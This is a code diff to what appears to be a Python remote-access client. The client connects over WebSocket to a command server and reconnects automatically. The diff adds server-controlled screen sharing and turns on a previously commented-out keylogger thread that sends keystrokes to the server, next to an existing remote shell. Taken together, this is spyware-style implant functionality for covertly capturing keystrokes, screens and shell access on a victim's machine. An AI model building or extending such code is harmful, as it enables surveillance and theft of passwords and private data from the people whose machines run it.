@@ -8,6 +8,7 @@ import util
 import keylogger
 import classes
 import shell
+import screenshare
 
 SERVER_URL = "ws://localhost:8080/ws/seeker"
 RECONNECT_DELAY = 5
@@ -45,6 +46,14 @@ def on_message(ws, message):
             else:
                 ws.send(json.dumps({"type": "shell_output", "data": "[Info] Shell not running."}))
 
+        elif msg_type == "screenshare_command":
+            if msg_data == "start":
+                screenshare.start_screenshare(ws_holder)
+            elif msg_data == "stop":
+                screenshare.stop_screenshare()
+            else:
+                ws.send(json.dumps({"type": "screenshare_output", "data": f"[Info] Unknown screenshare_command: {msg_data}"}))
+
         elif msg_type == "Disconnect":
             print(f"[Info] Received server-initiated disconnect: {msg_data}")
             should_reconnect = False
@@ -53,14 +62,13 @@ def on_message(ws, message):
     except json.JSONDecodeError:
         print("[Error] Failed to decode server message.")
 
-
 def on_error(ws, error):
     print(f"[WebSocket Error] {error}")
-
 
 def on_close(ws, close_status_code, close_msg):
     print("[WebSocket] Connection closed.")
     shell.stop_shell(ws)
+    screenshare.stop_screenshare()
 
 def on_open(ws):
     global seconds_disconnected, ws_holder
@@ -107,8 +115,8 @@ def main():
     client_uuid = args.uuid or str(uuid.uuid4())
     print(f"[Info] Using UUID: {client_uuid}")
 
-    #keylogger_thread = threading.Thread(target=keylogger.start, args=(ws_holder,), daemon=True)
-    #keylogger_thread.start()
+    keylogger_thread = threading.Thread(target=keylogger.start, args=(ws_holder,), daemon=True)
+    keylogger_thread.start()
 
     thread = threading.Thread(target=run_websocket, daemon=True)
     thread.start()
@@ -120,6 +128,7 @@ def main():
         print("\n[Shutdown] Exiting client.")
         if shell.shell_running:
             shell.stop_shell(ws_holder.ws)
+        screenshare.stop_screenshare()
 
 if __name__ == "__main__":
     main()
